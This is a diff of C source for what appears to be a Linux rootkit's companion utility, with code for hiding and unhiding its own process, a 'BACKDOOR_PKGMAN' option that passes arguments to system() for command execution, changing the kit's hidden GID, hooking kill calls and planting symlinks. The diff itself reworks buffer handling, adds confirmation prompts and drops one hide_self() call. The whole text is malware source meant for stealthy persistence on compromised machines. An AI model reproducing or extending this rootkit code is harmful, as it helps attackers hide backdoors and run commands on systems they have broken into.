@@ -8,12 +8,13 @@ void option_err(char *a0){
     printf("\t%s changegid\n", a0);
 #endif
 #ifdef BACKDOOR_PKGMAN
-    char validmans[128], tmp[8];
+    char validmans[16*VALIDPKGMANS_SIZE];
     memset(validmans, 0, sizeof(validmans));
-    for(int i = 0; i != sizeofarr(validpkgmans); i++){
+    for(int i = 0; i != VALIDPKGMANS_SIZE; i++){
+        char tmp[strlen(validpkgmans[i])+2];
         memset(tmp, 0, sizeof(tmp));
         snprintf(tmp, sizeof(tmp), "%s/", validpkgmans[i]);
-        strncat(validmans, tmp, 8);
+        strncat(validmans, tmp, sizeof(validpkgmans));
     }
     validmans[strlen(validmans)-1]='\0';
     printf("\t%s %s <args>\n", a0, validmans);
@@ -42,8 +43,6 @@ void do_self(void){
 #else
     execl(args[0], args[1], NULL);
 #endif
-
-    hide_self();
     exit(0);
 }
 
@@ -66,7 +65,7 @@ void symlinkstuff(void){
 
         syml = (long)call(CSYMLINK, src, dest);
         if(syml < 0 && errno == EEXIST){
-            printf("Link \e[31m%s\e[0m already exists... It \e[1mreally\e[0m shouldn't.\n", linkname);
+            printf("Link \e[31m%s\e[0m already exists...\n", linkname);
             continue;
         }else if(syml < 0){
             printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
@@ -89,22 +88,29 @@ void dobdvutil(char *const argv[]){
 
 #ifdef BACKDOOR_PKGMAN
     char *pkgman;
-    for(int pkgmani = 0; pkgmani != sizeofarr(validpkgmans); pkgmani++){
+    for(int pkgmani = 0; pkgmani != VALIDPKGMANS_SIZE; pkgmani++){
         pkgman = validpkgmans[pkgmani];
 
         if(!strcmp(pkgman, option)){
-            char argbuf[512], tmp[128];
+            char argbuf[256];
             memset(argbuf, 0, sizeof(argbuf));
+            
+            for(int argi = 1; argv[argi] != NULL; argi++){
+                char tmp[strlen(argv[argi])+2];
+                memset(tmp, 0, sizeof(tmp));
+                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
+                strncat(argbuf, tmp, sizeof(argbuf));
+            }
+            argbuf[strlen(argbuf)-1]='\0';
+
+            printf("system(\"%s\")\n", argbuf);
+            printf("This process \e[1;31mwill not\e[0m be hidden.\n");
+            printf("Press enter to confirm.");
+            getchar();
+
             chdir("/");
             unhide_self();
             system("id");
-            for(int argi = 1; argv[argi] != NULL; argi++){
-                memset(tmp, 0, sizeof(tmp));
-                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
-                strcat(argbuf, tmp);
-            }
-            argbuf[strlen(argbuf)-1]='\0';
-            printf("system(\"%s\");\n", argbuf);
             system(argbuf);
             exit(0);
         }
@@ -114,13 +120,14 @@ void dobdvutil(char *const argv[]){
 #ifdef READ_GID_FROM_FILE
     if(!strcmp("changegid", option)){
         gid_t newgid;
-        printf("Changing kit GID.\n");
-        printf("Current GID: %d\n", readgid());
-        printf("Press enter to continue.");
+        printf("Changing kit GID. You must \e[1;31mreconnect\e[0m once it has changed.\n");
+        printf("Make sure you don't have any other \e[1;31mprocesses running\e[0m other than this.\n");
+        printf("Current GID: \e[1;31m%d\e[0m\n", readgid());
+        printf("Press enter to confirm.");
         getchar();
         
         newgid = changerkgid();
-        printf("New GID: %d\n", newgid);
+        printf("New GID: \e[1;31m%d\e[0m\n", newgid);
 
         hook(CKILL);
         call(CKILL, getppid(), SIGKILL);
@@ -143,8 +150,6 @@ void dobdvutil(char *const argv[]){
     if(!strcmp("makelinks", option))
         symlinkstuff();
 
-    // option was neither changegid or unhideself.
-    // file op desired.
     path = argv[2];
     if(path == NULL)
         option_err(argv[0]);
